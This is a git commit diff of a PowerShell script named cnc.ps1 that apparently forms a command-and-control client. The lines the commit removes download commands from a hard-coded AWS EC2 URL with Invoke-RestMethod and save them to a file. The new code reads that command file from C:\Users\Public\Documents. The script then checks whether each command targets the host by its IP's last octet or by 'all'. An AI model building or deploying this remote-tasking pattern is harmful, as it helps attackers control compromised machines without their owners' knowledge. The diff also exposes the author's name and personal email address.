644fe622efd2fcf01be86b2b05505ab806611a3e
Anthony Magrene <ekfhalomaster@gmail.com>
2021-04-29 22:46:18 -0400

    Update cnc.ps1

--- cnc.ps1
+++ cnc.ps1
@@ -1,9 +1,7 @@
     $hostIP= Get-NetIPAddress | where {($_.IPAddress -like "10.*")} | foreach{$_.IPAddress}
-    $cNcURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt'
-        $httpCommand=invoke-restmethod $cNcURL
-        $httpCommand | out-file -filepath .\rf.txt
 
-        [string[]]$read = get-content -path .\rf.txt
+
+        [string[]]$read = get-content -path C:\Users\Public\Documents\rf.txt
         rm .\rf.txt
     
         if($read[1] -eq ($hostIP.split("."))[3] -or $read[1] -eq 'all'){
